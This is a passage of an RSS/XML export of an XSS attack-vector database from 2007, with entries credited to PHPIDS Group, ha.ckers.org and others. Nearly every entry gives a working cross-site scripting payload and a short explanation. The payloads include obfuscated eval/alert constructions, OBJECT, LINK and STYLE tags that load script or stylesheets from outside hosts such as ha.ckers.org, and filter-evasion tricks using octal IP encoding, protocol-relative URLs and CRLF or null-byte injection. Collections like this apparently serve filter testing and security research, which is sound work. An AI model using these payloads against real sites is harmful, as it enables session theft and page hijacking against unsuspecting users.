<ddb:exploitString>123[''+&lt;_&gt;ev&lt;/_&gt;+&lt;_&gt;al&lt;/_&gt;](''+&lt;_&gt;aler&lt;/_&gt;+&lt;_&gt;t&lt;/_&gt;+&lt;_&gt;(1)&lt;/_&gt;);</ddb:exploitString>      <ddb:exploitTags>general, xml predicates, obfuscated, gecko</ddb:exploitTags>    </item>    <item>      <title>Obfuscated XML predicate vector variation 2</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=7142</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Obfuscated XML predicate vector variation 2&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;s1=&lt;s&gt;evalalerta(1)a&lt;/s&gt;,s2=&lt;s&gt;&lt;/s&gt;+'',s3=s1+s2,e1=/s/!=/s/?s3[0]:&lt;br&gt;0,e2=/s/!=/s/?s3[1]:0,e3=/s/!=/s/?s3[2]:0,e4=/s/!=/s/?s3[3]:0,e=/s/!=/&lt;br&gt;s/?0[e1+e2+e3+e4]:0,a1=/s/!=/s/?s3[4]:0,a2=/s/!=/s/?s3[5]:0,a3=/s/!=/&lt;br&gt;s/?s3[6]:0,a4=/s/!=/s/?s3[7]:0,a5=/s/!=/s/?s3[8]:0,a6=/s/!=/s/?s3[10]:&lt;br&gt;0,a7=/s/!=/s/?s3[11]:0,a8=/s/!=/s/?s3[12]:&lt;br&gt;0,a=a1+a2+a3+a4+a5+a6+a7+a8,1,e(a)&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector uses XML predicates to obfuscate its payload and the fact that you can use underscores as XML tags. Also a concatenation via ternary operator is being used.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, xml predicates, obfuscated, gecko&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Mon, 17 Sep 07 07:42:01 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector uses XML predicates to obfuscate its payload and the fact that you can use underscores as XML tags. Also a concatenation via ternary operator is being used.</ddb:exploitDescription>      <ddb:exploitName>Obfuscated XML predicate vector variation 2</ddb:exploitName>      <ddb:exploitString>s1=&lt;s&gt;evalalerta(1)a&lt;/s&gt;,s2=&lt;s&gt;&lt;/s&gt;+'',s3=s1+s2,e1=/s/!=/s/?s3[0]:&#13;&#10;0,e2=/s/!=/s/?s3[1]:0,e3=/s/!=/s/?s3[2]:0,e4=/s/!=/s/?s3[3]:0,e=/s/!=/&#13;&#10;s/?0[e1+e2+e3+e4]:0,a1=/s/!=/s/?s3[4]:0,a2=/s/!=/s/?s3[5]:0,a3=/s/!=/&#13;&#10;s/?s3[6]:0,a4=/s/!=/s/?s3[7]:0,a5=/s/!=/s/?s3[8]:0,a6=/s/!=/s/?s3[10]:&#13;&#10;0,a7=/s/!=/s/?s3[11]:0,a8=/s/!=/s/?s3[12]:&#13;&#10;0,a=a1+a2+a3+a4+a5+a6+a7+a8,1,e(a)</ddb:exploitString>      <ddb:exploitTags>general, xml predicates, obfuscated, gecko</ddb:exploitTags>    </item>    <item>      <title>Obfuscated XML predicate vector variation 3</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=7154</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Obfuscated XML predicate vector variation 3&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;o={x:''+&lt;s&gt;eva&lt;/s&gt;+&lt;s&gt;l&lt;/s&gt;,y:''+&lt;s&gt;aler&lt;/s&gt;+&lt;s&gt;t&lt;/s&gt;+&lt;s&gt;(1)&lt;/&lt;br&gt;s&gt;};function f() { 0[this.x](this.y) }f.call(o);&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector uses XML predicates to obfuscate its payload. The payload is furthermore wrapped into JSON literals for more obfuscation.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, xml predicates, obfuscated, gecko, JSON&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Mon, 17 Sep 07 07:32:40 -0400</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector uses XML predicates to obfuscate its payload. The payload is furthermore wrapped into JSON literals for more obfuscation.</ddb:exploitDescription>      <ddb:exploitName>Obfuscated XML predicate vector variation 3</ddb:exploitName>      <ddb:exploitString>o={x:''+&lt;s&gt;eva&lt;/s&gt;+&lt;s&gt;l&lt;/s&gt;,y:''+&lt;s&gt;aler&lt;/s&gt;+&lt;s&gt;t&lt;/s&gt;+&lt;s&gt;(1)&lt;/&#13;&#10;s&gt;};function f() { 0[this.x](this.y) }f.call(o);</ddb:exploitString>      <ddb:exploitTags>general, xml predicates, obfuscated, gecko, JSON</ddb:exploitTags>    </item>    <item>      <title>Obfuscated XSS variant 1</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1844</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Obfuscated XSS variant 1&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;___=1?'ert(123)':0,_=1?'al':0,__=1?'ev':0,1[__+_](_+___)&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Shuffled and obfuscated function calls&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Shuffled and obfuscated function calls</ddb:exploitDescription>      <ddb:exploitName>Obfuscated XSS variant 1</ddb:exploitName>      <ddb:exploitString>___=1?'ert(123)':0,_=1?'al':0,__=1?'ev':0,1[__+_](_+___)</ddb:exploitString>      <ddb:exploitTags>general, obfuscated</ddb:exploitTags>    </item>    <item>      <title>OBJECT</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1896</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;OBJECT&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;If they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag. The linked file is actually an HTML file that can contain your XSS&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:15:10 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>If they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag. The linked file is actually an HTML file that can contain your XSS</ddb:exploitDescription>      <ddb:exploitName>OBJECT</ddb:exploitName>      <ddb:exploitString>&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags</ddb:exploitTags>    </item>    <item>      <title>OBJECT w/Embedded XSS</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1897</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;OBJECT w/Embedded XSS&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert('XSS')&gt;&lt;/OBJECT&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Using an OBJECT tag you can embed XSS directly (this is unverified).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:15:27 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Using an OBJECT tag you can embed XSS directly (this is unverified).</ddb:exploitDescription>      <ddb:exploitName>OBJECT w/Embedded XSS</ddb:exploitName>      <ddb:exploitString>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert('XSS')&gt;&lt;/OBJECT&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, internet explorer</ddb:exploitTags>    </item>    <item>      <title>OBJECT w/Flash 2</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1899</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;OBJECT w/Flash 2&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert('XSS');&quot;)&quot;;eval(a+b+c+d);&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Using this action script inside flash can obfuscate your XSS vector.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:15:46 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Using this action script inside flash can obfuscate your XSS vector.</ddb:exploitDescription>      <ddb:exploitName>OBJECT w/Flash 2</ddb:exploitName>      <ddb:exploitString>a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert('XSS');&quot;)&quot;;eval(a+b+c+d);</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Octal Encoding</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1968</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Octal Encoding&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).&lt;br&gt;Padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc...&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:21:56 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).&#13;&#10;Padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc...</ddb:exploitDescription>      <ddb:exploitName>Octal Encoding</ddb:exploitName>      <ddb:exploitString>&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Open string contained in name property</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=3231</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Open string contained in name property&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;open(name)&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This very simple but effective vector uses the open method on the name property.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, super short, self contained&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;SIrDarckCat</description>      <pubDate>Sun, 26 Aug 07 16:47:52 -0400</pubDate>      <ddb:authorName>SIrDarckCat</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This very simple but effective vector uses the open method on the name property.</ddb:exploitDescription>      <ddb:exploitName>Open string contained in name property</ddb:exploitName>      <ddb:exploitString>open(name)</ddb:exploitString>      <ddb:exploitTags>general, super short, self contained</ddb:exploitTags>    </item>    <item>      <title>PHP</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1922</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;PHP&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;? echo('&lt;SCR)';echo('IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;'); ?&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;PHP - requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts remotely like this, there are probably much more dire issues.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:15:59 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>PHP - requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts remotely like this, there are probably much more dire issues.</ddb:exploitDescription>      <ddb:exploitName>PHP</ddb:exploitName>      <ddb:exploitString>&lt;? echo('&lt;SCR)';echo('IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;'); ?&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Plain JavaScript alert</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=3377</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Plain JavaScript alert&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;alert(1)&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This very basic exploit works on surprisingly many pages - no real danger but bad image.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, basic, super short&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Tue, 28 Aug 07 09:47:35 -0400</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This very basic exploit works on surprisingly many pages - no real danger but bad image.</ddb:exploitDescription>      <ddb:exploitName>Plain JavaScript alert</ddb:exploitName>      <ddb:exploitString>alert(1)</ddb:exploitString>      <ddb:exploitTags>general, basic, super short</ddb:exploitTags>    </item>    <item>      <title>Protocol Resolution Bypass</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1970</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Protocol Resolution Bypass&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).&lt;br&gt;Protocol resolution bypass (// translates to http:// which saves a few more bytes). This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like ”(ht|f)tp(s)?://” (thanks to Ozh (http://planetOzh.com/) for part of this one). You can also change the ”//” to ”\\”. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:20:58 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).&#13;&#10;Protocol resolution bypass (// translates to http:// which saves a few more bytes). This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like ”(ht|f)tp(s)?://” (thanks to Ozh (http://planetOzh.com/) for part of this one). You can also change the ”//” to ”\\”. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.</ddb:exploitDescription>      <ddb:exploitName>Protocol Resolution Bypass</ddb:exploitName>      <ddb:exploitString>&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Protocol resolution in script tags</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1948</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Protocol resolution in script tags&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This particular variant was submitted by Lukasz Pilorz and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a &lt;/SCRIPT&gt; tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The ”.j” is valid, regardless of the MIME type because the browser knows it in context of a SCRIPT tag.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:31:11 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This particular variant was submitted by Lukasz Pilorz and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a &lt;/SCRIPT&gt; tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The ”.j” is valid, regardless of the MIME type because the browser knows it in context of a SCRIPT tag.</ddb:exploitDescription>      <ddb:exploitName>Protocol resolution in script tags</ddb:exploitName>      <ddb:exploitString>&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, injection</ddb:exploitTags>    </item>    <item>      <title>RegExp based, and native C filter vector.</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2621</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;RegExp based, and native C filter vector.&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;0%0d%0a%00&lt;script src=//h4k.in&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This will break any RegExp that includes &quot;$&quot; (end of string), and some filters that do the verification manually with a for waiting for a NULL byte.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, injection, CRLF, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;SIrDarckCat&lt;br&gt;&lt;b&gt;Author URL: &lt;/b&gt;&lt;a href=&quot;http://sirdarckcat.net/&quot;&gt;sirdarckcat.net&lt;/a&gt;</description>      <pubDate>Mon, 13 Aug 07 10:30:35 -0400</pubDate>      <ddb:authorName>SIrDarckCat</ddb:authorName>      <ddb:authorUrl>sirdarckcat.net</ddb:authorUrl>      <ddb:exploitDescription>This will break any RegExp that includes &quot;$&quot; (end of string), and some filters that do the verification manually with a for waiting for a NULL byte.</ddb:exploitDescription>      <ddb:exploitName>RegExp based, and native C filter vector.</ddb:exploitName>      <ddb:exploitString>0%0d%0a%00&lt;script src=//h4k.in&gt;</ddb:exploitString>      <ddb:exploitTags>general, injection, CRLF, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Remote IE URL overloading</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=4058</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Remote IE URL overloading&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)&lt;br&gt;'+'';&lt;br&gt;u1=s1+s2+s3;URL=u1&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector assembles an alert which will be fired using the URL property.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, obfuscated, internet explorer, URL breaking&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;thespanner.co.uk</description>      <pubDate>Tue, 04 Sep 07 10:04:13 -0400</pubDate>      <ddb:authorName>thespanner.co.uk</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector assembles an alert which will be fired using the URL property.</ddb:exploitDescription>      <ddb:exploitName>Remote IE URL overloading</ddb:exploitName>      <ddb:exploitString>s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)&#13;&#10;'+'';&#13;&#10;u1=s1+s2+s3;URL=u1</ddb:exploitString>      <ddb:exploitTags>general, obfuscated, internet explorer, URL breaking</ddb:exploitTags>    </item>    <item>      <title>Remote Stylesheet 1</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1906</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Remote Stylesheet 1&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Remote style sheet (using something as simple as a remote style sheet you can include your XSS as the style question redefined using an embedded expression.) This only works in IE and Netscape 8.1+ in IE rendering engine mode.  Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:16:18 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Remote style sheet (using something as simple as a remote style sheet you can include your XSS as the style question redefined using an embedded expression.) This only works in IE and Netscape 8.1+ in IE rendering engine mode.  Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page.</ddb:exploitDescription>      <ddb:exploitName>Remote Stylesheet 1</ddb:exploitName>      <ddb:exploitString>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, injection</ddb:exploitTags>    </item>    <item>      <title>Remote Stylesheet 2</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1907</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Remote Stylesheet 2&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Remote style sheet part 2 (this works the same as above, but uses a &lt;STYLE&gt; tag instead of a &lt;LINK&gt; tag). A slight variation on this vector was used to hack Google Desktop http://www.hacker.co.il/security/ie/css_import.html.  As a side note you can remote the end STYLE tag if there is HTML immediately after the vector to close it.  This is useful if you cannot have either an equal sign or a slash in your cross site scripting attack, which has come up at least once in the real world.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, style injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:16:34 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Remote style sheet part 2 (this works the same as above, but uses a &lt;STYLE&gt; tag instead of a &lt;LINK&gt; tag). A slight variation on this vector was used to hack Google Desktop http://www.hacker.co.il/security/ie/css_import.html.  As a side note you can remote the end STYLE tag if there is HTML immediately after the vector to close it.  This is useful if you cannot have either an equal sign or a slash in your cross site scripting attack, which has come up at least once in the real world.</ddb:exploitDescription>      <ddb:exploitName>Remote Stylesheet 2</ddb:exploitName>      <ddb:exploitString>&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, style injection</ddb:exploitTags>    </item>    <item>      <title>Remote Stylesheet 3</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1908</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Remote Stylesheet 3&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Remote style sheet part 3. This only works in Opera but is fairly tricky.  Setting a link header is not part of the HTTP1.1 spec. However, some browsers still allow it (like Firefox and Opera).  The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: &lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:16:48 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Remote style sheet part 3. This only works in Opera but is fairly tricky.  Setting a link header is not part of the HTTP1.1 spec. However, some browsers still allow it (like Firefox and Opera).  The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: &lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox.</ddb:exploitDescription>      <ddb:exploitName>Remote Stylesheet 3</ddb:exploitName>      <ddb:exploitString>&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, injection</ddb:exploitTags>    </item>    <item>      <title>Remote Stylesheet 4</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1909</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Remote Stylesheet 4&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Remote style sheet part 4.  This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefore is vulnerable to this for the vast majority of sites.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, style injection, XBL&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Mon, 26 Nov 07 08:40:11 -0500</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Remote style sheet part 4.  This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefore is vulnerable to this for the vast majority of sites.</ddb:exploitDescription>      <ddb:exploitName>Remote Stylesheet 4</ddb:exploitName>      <ddb:exploitString>&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, style injection, XBL</ddb:exploitTags>    </item>    <item>      <title>Removing Cnames</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1974</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Removing Cnames&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).&lt;br&gt;When combined with the above URL, removing ”www.” will save an additional 4 bytes for a total byte savings of 9 for servers that have this set up properly.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:17:17 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).&#13;&#10;When combined with the above URL, removing ”www.” will save an additional 4 bytes for a total byte savings of 9 for servers that have 